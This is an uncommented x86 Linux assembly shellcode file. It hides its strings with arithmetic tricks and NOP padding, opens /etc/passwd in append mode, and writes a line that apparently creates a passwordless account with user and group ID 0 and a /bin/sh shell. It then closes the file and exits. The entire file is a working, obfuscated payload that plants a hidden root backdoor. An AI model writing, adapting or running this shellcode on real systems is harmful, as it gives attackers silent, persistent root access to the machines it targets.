global _start

section .text

_start:

      
      xor ebx,ebx
      mov ecx,ebx
      push ebx
      mov eax, 0xcefedebe	      
      sub eax, 0x6A876B4B
      push eax
      NOP
      NOP
      push dword 0x61702f63
      NOP
      add eax, 0x0fedbbbc
      push eax
      mov eax, ebx	
      mov ebx,esp
      mov cx,0x401
      xor eax, eax
      mov al,0x5
      int 0x80
      mov ebx,eax
      xor eax,eax
      mov edx,eax
      NOP	
      push dword 0x68732f6e
      NOP
      mov eax, 0x69622f2f
      push eax
      sub eax, 0x2f32f4f5
      push eax
      sub ah,0x0A
      push ax
      push ax
      mov eax,edx	
      NOP		 	 
      push dword 0x3a637363
      NOP
      mov ecx,esp
      mov dl,0x14
      mov al,0x4
      int 0x80
      xor eax,eax
      mov al,0x6
      int 0x80
      xor eax,eax
      mov al,0x1
      int 0x80
